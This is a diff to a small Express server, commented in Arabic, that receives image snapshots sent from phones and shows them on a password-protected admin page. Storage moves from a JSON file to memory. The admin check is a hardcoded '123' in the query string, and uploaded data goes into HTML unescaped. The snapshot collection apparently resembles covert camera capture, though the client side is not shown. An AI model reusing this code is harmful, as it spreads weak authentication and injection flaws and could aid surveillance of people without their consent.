@@ -1,5 +1,4 @@
 const express = require('express');
-const fs = require('fs');
 const path = require('path');
 const app = express();
 
@@ -7,21 +6,10 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ملف JSON لتخزين الصور بشكل دائم ومضمون
-const jsonFile = path.join(__dirname, 'images.json');
+// مصفوفة مؤقتة في الذاكرة لتخزين وعرض جميع الصور الملتقطة لحظياً
+let storedImages = [];
 
-// دالة لجلب الصور المحفوظة
-function getStoredImages() {
-    if (!fs.existsSync(jsonFile)) return [];
-    try {
-        const data = fs.readFileSync(jsonFile, 'utf8');
-        return JSON.parse(data);
-    } catch (e) {
-        return [];
-    }
-}
-
-// مسار استقبال الصورة وحفظها في ملف JSON
+// مسار استقبال الصورة من الموبايل
 app.post('/upload-snapshot', (req, res) => {
     const imageData = req.body.image;
     if (!imageData) {
@@ -29,18 +17,19 @@ app.post('/upload-snapshot', (req, res) => {
     }
 
     try {
-        const images = getStoredImages();
         const newImage = {
             id: Date.now(),
             data: imageData,
             time: new Date().toLocaleString()
         };
 
-        // إضافة الصورة الجديدة في بداية القائمة
-        images.unshift(newImage);
+        // إضافة الصورة الجديدة في بداية القائمة لتظهر أولاً في الـ Admin
+        storedImages.unshift(newImage);
 
-        // حفظ القائمة في ملف الـ JSON
-        fs.writeFileSync(jsonFile, JSON.stringify(images, null, 2));
+        // الاحتفاظ بأحدث 50 صورة فقط لضمان سرعة الخادم
+        if (storedImages.length > 50) {
+            storedImages.pop();
+        }
 
         res.json({ success: true });
     } catch (e) {
@@ -49,7 +38,7 @@ app.post('/upload-snapshot', (req, res) => {
     }
 });
 
-// مسار لوحة التحكم لعرض الصور مباشرة من الـ JSON
+// مسار لوحة التحكم لعرض الصور مباشرة
 app.get('/admin', (req, res) => {
     const password = req.query.pass;
     if (password !== '123') {
@@ -62,8 +51,7 @@ app.get('/admin', (req, res) => {
         `);
     }
 
-    const images = getStoredImages();
-    let imagesHtml = images.map(img => `
+    let imagesHtml = storedImages.map(img => `
         <div style="display:inline-block; margin:15px; text-align:center; background:#f9f9f9; padding:10px; border-radius:8px; border:1px solid #ddd;">
             <img src="${img.data}" width="220" style="border-radius:6px;" /><br>
             <small style="color:#666; display:block; margin-top:5px;">${img.time}</small>
